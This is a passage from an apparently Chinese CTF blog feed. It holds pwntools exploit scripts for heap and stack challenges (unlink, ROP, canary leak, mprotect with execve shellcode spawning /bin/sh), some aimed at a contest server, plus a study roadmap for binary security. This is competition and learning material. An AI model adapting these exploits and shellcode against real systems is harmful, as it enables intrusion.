class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'Input new pass:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Input the passwords length:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Input the password:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x18</span>,p64(<span class="number">0x400310</span>)+p64(<span class="number">0x400F2B</span>))</span><br><span class="line">show(<span class="number">0</span>,<span class="number">255</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0x400f33</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(<span class="number">0x400710</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_base+libc.search(<span class="string">'/bin/sh'</span>).next())+p64(libc_base+libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">show(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x03-silence_note">0x03 silence_note</span></h2><p>这道题比赛的时候没有做出来，主要是自己太菜了，眼瞎了，看见限制这么多条件，一直想着怎么去绕过这个条件，却不知道摆在眼前的unlink漏洞，这道题是我赛后复现出来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">"./silent_note"</span>)</span><br><span class="line">p=process(<span class="string">"./silent_note"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(opt,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line">p.sendafter(<span class="string">"Content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(opt)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(opt,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line">p.sendafter(<span class="string">"Content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">hack()</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">small_ptr=<span class="number">0x6020d0</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(small_ptr<span class="number">-0x18</span>)+p64(small_ptr<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6020c8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(elf.symbols[<span class="string">'puts'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'calloc'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'calloc'</span>]</span><br><span class="line">success(<span class="string">"libc_base====&gt;0x%x"</span>%leak_libc)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak_libc+libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近没怎么更新博客，太忙了，最近得比赛有点多。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-boringheap&quot;&gt;0x01 boringheap&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;这一道题主要是存在abs得整型溢出漏洞，当我输入0x80000000的时候，会溢出，会得到一个负
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="abs负数溢出" scheme="http://Whali3n51.top/tags/abs%E8%B4%9F%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    
      <category term="unlink" scheme="http://Whali3n51.top/tags/unlink/"/>
    
  </entry>
  
  <entry>
    <title>给新生—关于二进制怎么学习</title>
    <link href="http://whali3n51.top/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/"/>
    <id>http://whali3n51.top/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-09-01T04:41:00.000Z</published>
    <updated>2020-01-08T07:00:17.112Z</updated>
    
    <content type="html"><![CDATA[<p>二进制的学习起初是很枯燥和无聊的，还有对很多人来说很难，主要是兴趣吧。下面的只是我关于学习二进制的一些路线总结，也不一定非要照着我下面一步一步的走，可以同时进行。比如你学习完一遍C语言了，你这个时候不可能马上去学第二遍吧，然后你就可以去学习下一步。然后发现不懂，又回来学习，或者下一步的学习能给你答案。我给的只是大致的路线，因人而异。不要固执的非要照着我写的这个顺序来，但是都是要学习的。</p><h2><span id="第一步">第一步：</span></h2><p>一定要学C语言。不要说C语言难学怎么着。想学习二进制这方向必须的学好C语言，一遍学不好两遍，两遍学不好三遍。我个人就学习了三遍，每一遍都有新收获。还有一点，C语言不是只听听就完事了，一定动手写，跟着老师写，写完之后自己再写一遍，写完写作业，做笔记写领悟（建议在有道云笔记上面写）。<br>推荐学习时长：每遍两周。可以每遍缩短时长，根据个人情况。<br>推荐课程：<br>小甲鱼 带你学C带你飞：<a href="https://www.bilibili.com/video/av27744141?from=search&amp;seid=15059827262621129435" target="_blank" rel="noopener">https://www.bilibili.com/video/av27744141?from=search&amp;seid=15059827262621129435</a><br>中国大学MOOC 苏小红讲授的C语言：<a href="https://www.icourse163.org/course/HIT-69005" target="_blank" rel="noopener">https://www.icourse163.org/course/HIT-69005</a><br>周哥教IT C语言深学活用：<a href="https://ke.qq.com/course/242707?taid=1573117671748627" target="_blank" rel="noopener">https://ke.qq.com/course/242707?taid=1573117671748627</a></p><h2><span id="第二步">第二步：</span></h2><p>这个时候就可以开始学习使用IDA和OllyDBG，IDA的使用一般网上都有人写一些基础用法，这个时候就不要想视频了，没有视频，看大佬博客，使被动学习转换为主动学习。ollydbg的使用可以看小甲鱼的视频，相信你们也看到了小甲鱼出的一些相关视频。学完这些，新生这个时候就可以开始做一些CTF中的Reverse方向的题来提升自己的信心。随便对C语言的又一次巩固。改天看我心情吧，我写一个IDA的用法。<br>小甲鱼 OD的使用：<a href="https://www.bilibili.com/video/av28046265?from=search&amp;seid=4879553389483862689" target="_blank" rel="noopener">https://www.bilibili.com/video/av28046265?from=search&amp;seid=4879553389483862689</a><br>推荐CTF网站（一时间只能想起来这几个了）：<br>bugku:<a href="https://ctf.bugku.com/login?next=challenges" target="_blank" rel="noopener">https://ctf.bugku.com/login?next=challenges</a><br>攻防世界(有梯度)：<a href="https://adworld.xctf.org.cn/task" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task</a><br>BUUCTF：<a href="http://buuoj.cn/" target="_blank" rel="noopener">http://buuoj.cn/</a></p><h2><span id="第三步">第三步:</span></h2><p>汇编学习，但是我们学习汇编的目的不是想学习C语言一样去写一个东西出来。我们是需要能看懂汇编指令，这个时候你们做过Reverse的题之后，你们就会发现，一打开IDA的那些指令是啥了。<br>推荐视频：<br>小甲鱼 8086汇编指令：<a href="https://www.bilibili.com/video/av28132657" target="_blank" rel="noopener">https://www.bilibili.com/video/av28132657</a></p><h2><span id="第四步">第四步</span></h2><p>可以开始学习PWN了。如果这个时候能学到这里的话，基本上进实验室的水平是有了。到时候我教你们怎么学吧。太多了，我写累了，我不想写了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;二进制的学习起初是很枯燥和无聊的，还有对很多人来说很难，主要是兴趣吧。下面的只是我关于学习二进制的一些路线总结，也不一定非要照着我下面一步一步的走，可以同时进行。比如你学习完一遍C语言了，你这个时候不可能马上去学第二遍吧，然后你就可以去学习下一步。然后发现不懂，又回来学习，
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.top/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>five空间大赛</title>
    <link href="http://whali3n51.top/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"/>
    <id>http://whali3n51.top/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/</id>
    <published>2019-09-01T03:22:00.000Z</published>
    <updated>2020-01-08T06:47:17.432Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="立雪">立雪</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn15')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50015</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Length of note:"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Length of note:'</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content of note:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020C0</span></span><br><span class="line">admin=<span class="number">0x602088</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2019'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="正定">正定</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn14')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50014</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content of note : '</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'dd'</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'ee'</span>)<span class="comment">#4</span></span><br><span class="line">chunk0_addr=<span class="number">0x4040C0</span></span><br><span class="line">admin=<span class="number">0x4040A0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'70'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="一苇">一苇</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./pwn13')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x50'</span></span><br><span class="line">p.sendafter(<span class="string">"input massage\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="拈花">拈花</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process("./pwn11")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50011</span>)</span><br><span class="line">libc=ELF(<span class="string">"libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn11"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x4012ab</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"ail!\n"</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'B'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(<span class="number">0x4012A2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401288</span>)</span><br><span class="line">payload+=<span class="string">'B'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="坐忘">坐忘</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process("./pwn9")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="string">"50009"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn9"</span>)</span><br><span class="line">mprotect=elf.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">9</span></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.recvuntil(<span class="string">"welcome to base64 decode server\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"decode res:\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))<span class="number">-0x41</span></span><br><span class="line">success(<span class="string">"canary =====&gt; 0x%x"</span>%canary)</span><br><span class="line">int_0x80=<span class="number">0x4bc587</span></span><br><span class="line">poprdi=<span class="number">0x401e36</span></span><br><span class="line">poprsi=<span class="number">0x401f57</span></span><br><span class="line">poprdx=<span class="number">0x4433e6</span></span><br><span class="line">start_addr=<span class="number">0x400890</span></span><br><span class="line">p.recvuntil(<span class="string">"continue ?"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_addr=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(bss_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(read_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"continue ?"</span>,<span class="string">"no"</span>)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="玄冥">玄冥</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 